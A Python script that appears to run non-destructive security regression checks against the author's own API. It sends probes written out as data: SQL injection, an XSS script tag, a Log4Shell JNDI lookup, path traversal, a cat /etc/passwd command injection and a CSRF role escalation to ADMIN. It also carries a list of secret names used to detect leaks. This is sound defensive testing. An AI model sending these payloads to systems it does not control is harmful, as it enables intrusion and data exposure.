#!/usr/bin/env python3
"""Advanced non-destructive security checks for the deployed API.

This script is meant for demo/showcase and deeper regression checks. It avoids
real payments, real AI calls, and real image uploads.
"""

from __future__ import annotations

import argparse
import http.cookiejar
import json
import os
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass
from typing import Any
from uuid import uuid4


DEFAULT_API_BASE_URL = "http://localhost:3000"
DEFAULT_EVIL_ORIGIN = "https://evil.example"
SENSITIVE_NEEDLES = [
    "database_url",
    "jwt_access_secret",
    "jwt_refresh_secret",
    "revenuecat_secret_api_key",
    "revenuecat_webhook_signing_secret",
    "gemini_api_key",
    "openai_api_key",
    "prisma",
    "stack trace",
    "traceback",
]


@dataclass
class Response:
    status: int
    headers: dict[str, list[str]]
    body: bytes
    error: str | None = None

    def header(self, name: str) -> str | None:
        values = self.headers.get(name.lower())
        return ", ".join(values) if values else None

    def text(self) -> str:
        return self.body.decode("utf-8", errors="replace")

    def json(self) -> Any:
        return json.loads(self.text())


class AdvancedSecurityE2E:
    def __init__(
        self,
        api_base_url: str,
        evil_origin: str,
        user_a_email: str | None,
        user_a_password: str | None,
        user_b_email: str | None,
        user_b_password: str | None,
    ) -> None:
        self.api_base_url = api_base_url.rstrip("/")
        self.evil_origin = evil_origin
        self.demo_users = {
            "a": (user_a_email, user_a_password),
            "b": (user_b_email, user_b_password),
        }
        self.ssl_context = ssl.create_default_context()
        self.cookie_jar = http.cookiejar.CookieJar()
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.cookie_jar),
            urllib.request.HTTPSHandler(context=self.ssl_context),
        )
        self.checks = 0
        self.failures = 0
        self.warnings = 0
        self.category_counts: dict[str, int] = {}

    @staticmethod
    def normalize_headers(headers: Any) -> dict[str, list[str]]:
        normalized: dict[str, list[str]] = {}
        for key, value in headers.items():
            normalized.setdefault(key.lower(), []).append(value)
        return normalized

    def request(
        self,
        method: str,
        path_or_url: str,
        *,
        json_body: Any | None = None,
        raw_body: bytes | None = None,
        headers: dict[str, str] | None = None,
        token: str | None = None,
        timeout: float = 12,
        use_cookies: bool = True,
    ) -> Response:
        url = (
            path_or_url
            if path_or_url.startswith("http://") or path_or_url.startswith("https://")
            else f"{self.api_base_url}{path_or_url}"
        )
        req_headers = dict(headers or {})
        data = raw_body
        if json_body is not None:
            data = json.dumps(json_body).encode("utf-8")
            req_headers.setdefault("Content-Type", "application/json")
        if token:
            req_headers["Authorization"] = f"Bearer {token}"

        req = urllib.request.Request(url, data=data, headers=req_headers, method=method)
        try:
            opener = self.opener if use_cookies else urllib.request.build_opener(
                urllib.request.HTTPSHandler(context=self.ssl_context)
            )
            with opener.open(req, timeout=timeout) as res:
                return Response(
                    status=res.status,
                    headers=self.normalize_headers(res.headers),
                    body=res.read(),
                )
        except urllib.error.HTTPError as exc:
            return Response(
                status=exc.code,
                headers=self.normalize_headers(exc.headers),
                body=exc.read(),
            )
        except Exception as exc:
            return Response(status=0, headers={}, body=b"", error=str(exc))

    def contains_sensitive_error(self, res: Response) -> bool:
        body = res.text().lower()
        return any(needle in body for needle in SENSITIVE_NEEDLES)

    def check(self, category: str, name: str, condition: bool, detail: str = "") -> None:
        self.checks += 1
        self.category_counts[category] = self.category_counts.get(category, 0) + 1
        suffix = f" - {detail}" if detail else ""
        if condition:
            print(f"PASS [{category}] {name}{suffix}")
            return
        self.failures += 1
        print(f"FAIL [{category}] {name}{suffix}")

    def warn(self, category: str, name: str, detail: str = "") -> None:
        self.warnings += 1
        suffix = f" - {detail}" if detail else ""
        print(f"WARN [{category}] {name}{suffix}")

    def extract_token(self, res: Response) -> str | None:
        try:
            payload = res.json()
            data = payload.get("data", payload) if isinstance(payload, dict) else {}
            token = data.get("accessToken") if isinstance(data, dict) else None
            return token if isinstance(token, str) and token else None
        except Exception:
            return None

    def extract_scan_id(self, res: Response) -> str | None:
        try:
            payload = res.json()
            data = payload.get("data", payload) if isinstance(payload, dict) else {}
            scan_id = data.get("scanId") if isinstance(data, dict) else None
            return scan_id if isinstance(scan_id, str) and scan_id else None
        except Exception:
            return None

    def register_user(self, label: str, use_cookies: bool = True) -> tuple[str | None, str]:
        email = f"advanced-e2e-{label}-{int(time.time() * 1000)}-{uuid4().hex[:8]}@example.com"
        res = self.request(
            "POST",
            "/api/auth/register",
            json_body={"email": email, "name": f"Advanced {label}", "password": "Teste12345!"},
            use_cookies=use_cookies,
        )
        token = self.extract_token(res)
        if res.status == 429:
            self.warn("setup", f"register temp user {label} rate limited", "use ADVANCED_E2E_USER_* envs for demos")
            return None, email
        self.check("setup", f"register temp user {label}", res.status == 201 and bool(token), f"status={res.status}")
        return token, email

    def login_user(self, label: str, email: str, password: str, use_cookies: bool = True) -> str | None:
        res = self.request(
            "POST",
            "/api/auth/login",
            json_body={"email": email, "password": password},
            use_cookies=use_cookies,
        )
        token = self.extract_token(res)
        self.check("setup", f"login demo user {label}", res.status == 200 and bool(token), f"status={res.status}")
        return token

    def get_user(self, label: str, use_cookies: bool = True) -> tuple[str | None, str, bool]:
        email, password = self.demo_users[label]
        if email and password:
            return self.login_user(label, email, password, use_cookies), email, False
        token, generated_email = self.register_user(label, use_cookies)
        return token, generated_email, bool(token)

    def cleanup_user(self, token: str | None, label: str) -> None:
        if not token:
            return
        res = self.request("DELETE", "/api/users/me", token=token, use_cookies=False)
        if res.status == 204:
            print(f"PASS [cleanup] delete temp user {label}")
        else:
            self.warn("cleanup", f"delete temp user {label}", f"status={res.status}")

    def assert_no_5xx_or_internal_leak(self, category: str, name: str, res: Response) -> None:
        self.check(category, f"{name} no 5xx/network error", 0 < res.status < 500, res.error or f"status={res.status}")
        self.check(category, f"{name} no internals", not self.contains_sensitive_error(res), f"status={res.status}")

    def run_waf_burp_payloads(self) -> None:
        payloads = [
            ("sqli query", "GET", "/api/health?id=1%20OR%201=1", {}, True),
            ("xss query", "GET", "/api/health?x=%3Cscript%3Ealert(1)%3C/script%3E", {}, True),
            ("log4shell user-agent", "GET", "/api/health", {"User-Agent": "${jndi:ldap://example.com/a}"}, True),
            ("path traversal", "GET", "/api/../api/health", {}, True),
            ("encoded traversal", "GET", "/api/%2e%2e/api/health", {}, True),
            ("command injection query", "GET", "/api/health?cmd=cat%20/etc/passwd", {}, False),
        ]
        for name, method, path, headers, should_block in payloads:
            res = self.request(method, path, headers=headers, use_cookies=False)
            self.assert_no_5xx_or_internal_leak("waf-burp", name, res)
            if res.status == 403:
                print(f"PASS [waf-burp] {name} blocked by edge/app - status=403")
            elif not should_block:
                print(f"PASS [waf-burp] {name} handled safely by app - status={res.status}")
            else:
                self.warn("waf-burp", f"{name} not blocked", f"status={res.status}; still acceptable if backend handled it")

    def run_csrf_cookie_only(self) -> None:
        cases = [
            ("patch user with cookie only", "PATCH", "/api/users/me", {"role": "ADMIN"}),
        ]
        headers = {"Origin": self.evil_origin}
        for name, method, path, body in cases:
            res = self.request(method, path, json_body=body, headers=headers, use_cookies=True)
            self.check("csrf", name, res.status == 401, f"status={res.status}")
            self.check(
                "csrf",
                f"{name} no evil cors",
                res.header("access-control-allow-origin") is None,
                f"allow-origin={res.header('access-control-allow-origin')}",
            )

    def run_removed_vps_scan_surface(self, token_a: str | None) -> None:
        if not token_a:
            self.check("scan-safety", "primary scan token available", False)
            return
        removed = self.request("POST", "/api/scans", token=token_a, use_cookies=False)
        self.check("scan-safety", "legacy VPS scan route removed", removed.status == 404, f"status={removed.status}")

    def run_webhook_replay_invalid(self) -> None:
        body = b'{"signedPayload":"forged.apple.notification.payload"}'
        headers = {
            "Content-Type": "application/json",
            "Authorization": "Bearer invalid",
        }
        endpoint = "/api/billing/apple/notifications"
        first = self.request("POST", endpoint, raw_body=body, headers=headers, use_cookies=False)
        second = self.request("POST", endpoint, raw_body=body, headers=headers, use_cookies=False)
        for label, res in [("first invalid webhook", first), ("replayed invalid webhook", second)]:
            self.check("webhook-replay", label, res.status in (400, 401, 503), f"status={res.status}")
            self.check("webhook-replay", f"{label} no internals", not self.contains_sensitive_error(res), f"status={res.status}")

    def run_load_test_surface(self) -> None:
        cases = [
            ("ping no key", "GET", "/api/load-test/ping", {}),
            ("db fake key", "GET", "/api/load-test/db", {"x-load-test-key": "fake"}),
        ]
        for name, method, path, headers in cases:
            res = self.request(method, path, headers=headers, use_cookies=False)
            self.check("load-test-surface", name, res.status == 404, f"status={res.status}")
            self.check("load-test-surface", f"{name} no internals", not self.contains_sensitive_error(res), f"status={res.status}")

    def run(self) -> int:
        print(f"API_BASE_URL={self.api_base_url}")
        print("MODE=advanced-safe")
        token_a, _email_a, cleanup_a = self.get_user("a")
        token_b, _email_b, cleanup_b = self.get_user("b", use_cookies=False)

        self.run_waf_burp_payloads()
        self.run_csrf_cookie_only()
        self.run_removed_vps_scan_surface(token_a)
        self.run_webhook_replay_invalid()
        self.run_load_test_surface()

        if cleanup_b:
            self.cleanup_user(token_b, "b")
        if cleanup_a:
            self.cleanup_user(token_a, "a")

        print("")
        print("CATEGORY_COUNTS")
        for category in sorted(self.category_counts):
            print(f"{category}={self.category_counts[category]}")
        print("")
        print(f"SUMMARY checks={self.checks} failures={self.failures} warnings={self.warnings}")
        return 1 if self.failures else 0


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Run advanced non-destructive API security checks.")
    parser.add_argument("--api-base-url", default=os.getenv("API_BASE_URL", DEFAULT_API_BASE_URL))
    parser.add_argument("--evil-origin", default=os.getenv("EVIL_ORIGIN", DEFAULT_EVIL_ORIGIN))
    parser.add_argument("--user-a-email", default=os.getenv("ADVANCED_E2E_USER_A_EMAIL"))
    parser.add_argument("--user-a-password", default=os.getenv("ADVANCED_E2E_USER_A_PASSWORD"))
    parser.add_argument("--user-b-email", default=os.getenv("ADVANCED_E2E_USER_B_EMAIL"))
    parser.add_argument("--user-b-password", default=os.getenv("ADVANCED_E2E_USER_B_PASSWORD"))
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    runner = AdvancedSecurityE2E(
        api_base_url=args.api_base_url,
        evil_origin=args.evil_origin,
        user_a_email=args.user_a_email,
        user_a_password=args.user_a_password,
        user_b_email=args.user_b_email,
        user_b_password=args.user_b_password,
    )
    return runner.run()


if __name__ == "__main__":
    sys.exit(main())
